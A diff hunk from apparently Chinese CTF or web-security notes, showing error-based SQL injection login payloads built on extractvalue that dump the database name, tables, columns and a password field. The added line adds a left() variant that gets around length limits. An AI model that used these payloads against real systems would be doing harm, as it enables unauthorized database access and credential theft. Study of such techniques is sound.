@@ -83,6 +83,7 @@ username=44&password=1'^extractvalue(1,concat(0x7e,(select(database()))))%23 //�
 username=44&password=1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables))))%23   //爆表名
 username=44&password=1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1')))))%23   //爆列名
 username=44&password=1'^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))%23   //爆字段名
+username=44&password=1%27^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23  //若有substr限制字符数就用这个
 ```
 
 * ### SQLMAP
